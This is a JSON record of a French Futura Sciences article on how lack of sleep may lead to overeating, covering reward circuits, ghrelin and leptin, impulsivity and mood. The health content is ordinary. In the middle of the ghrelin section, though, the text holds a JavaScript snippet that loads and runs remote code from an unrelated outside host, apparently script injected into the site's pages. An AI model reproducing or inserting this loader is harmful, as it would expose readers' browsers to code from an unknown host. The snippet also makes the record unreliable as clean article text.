{"title": "Manquer de sommeil predisposerait a trop manger", "newspaper": "Futura Sciences", "author": ["Marie-Celine Jacquier"], "date_publi": "2017-06-05", "content": "S'appuyant sur une vaste etude faisant le lien entre sommeil et temperatures, des scientifiques ont, en cette fin mai 2017, mis en garde contre les effets nefastes du rechauffement climatique sur notre sommeil. L'occasion de revenir sur l'une des consequences d'un sommeil de mauvaise qualite. En effet, les problemes de sommeil pourraient contribuer a des apports alimentaires excessifs et conduire, a long terme, a des problemes chroniques de sante chez les adultes et les enfants. Conclusion : pour eviter de trop manger, mieux vaut retrouver un bon sommeil. Article paru le 4 juin 2015 L'alimentation joue un role dans de nombreux problemes chroniques de sante :  obesite ,  diabete ,  maladies cardiovasculaires ... C'est pourquoi la modification des habitudes nutritionnelles de l'individu peut aider, prevenir et traiter ces maladies. Un nouvel article paru dans  Journal of Health Psychology  suggere aussi de traiter les problemes de  sommeil  : d'apres deux chercheurs de l'universite de Nebraska-Lincoln, qui signent une revue de litterature sur le lien entre sommeil et nutrition, une mauvaise nuit de sommeil influencerait le comportement alimentaire.  Il existe differentes preuves indiquant un lien entre un  sommeil insuffisant  et une augmentation des apports alimentaires, a la fois chez les enfants et les adultes : les problemes de sommeil, comme une  duree  de sommeil trop courte ou des horaires de sommeil variables, sont associes a une augmentation des apports alimentaires, chez les adultes et les enfants. Aussi, les auteurs passent en revue les mecanismes qui expliqueraient cette association.  Tout d'abord, les problemes de sommeil peuvent affecter les centres de la recompense dans le  cerveau , de telle sorte que l'individu en manque de sommeil recherchera plus d'aliments caloriques. Par exemple, il a ete observe que des personnes privees de sommeil cherchaient a consommer plus de  calories  provenant d'en-cas riches en  glucides  et en graisses. L'imagerie medicale suggere aussi une plus grande activation des regions du  cerveau  associees au  systeme de recompense  chez des individus en  manque de sommeil . L'individu en manque de sommeil a tendance a rechercher plus d'aliments caloriques. (c) Brave Heart, Flickr, CC by-nc-nd 2.0                       La ghreline, l'hormone qui ouvre l'appetit Un sommeil perturbe conduit par ailleurs a un etat hormonal qui predispose a la surconsommation de nourriture. Les hormones intervenant dans la faim et la  sensation de satiete  sont la  leptine  et la ghreline : la leptine envoie un signal de satiete aux centres de controle de l'appetit dans la region hypothalamique du cerveau, tandis que la ghreline envoie des signaux en provenance de l' estomac  qui favorisent une augmentation de l'appetit.  Or , un sommeil perturbe semble augmenter les niveaux de ghreline et les signaux qui ouvrent l'appetit.   ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Autre voie par laquelle le manque de sommeil agit sur le  comportement alimentaire  : le controle de la prise alimentaire. Un sommeil perturbe est associe a des problemes dans le fonctionnement cognitif. Par exemple, le  sommeil  joue un role dans le controle des emotions : le manque de sommeil a un impact negatif sur la reponse emotionnelle des enfants et leur capacite a gerer leurs emotions. Un sommeil perturbe est aussi associe a une plus grande impulsivite. Enfin, les problemes de sommeil peuvent pousser l'individu a percevoir des stimuli neutres comme etant davantage negatifs : il verra le verre plutot a moitie vide qu'a moitie plein. Une humeur negative est d'ailleurs elle-meme propice a une plus grande consommation de nourriture....  En definitive, apres une mauvaise nuit de sommeil, le systeme hormonal qui controle l' appetit  est affecte, le  stress  emotionnel est plus important, l'individu a envie de plus de nourriture calorique et son impulsivite augmente. Pour toutes ces raisons, l'individu qui dort mal aurait tendance a manger plus. Le sommeil devrait donc etre une des composantes des interventions visant a modifier le comportement alimentaire pour  prevenir l'obesite . ", "theme": "sante"}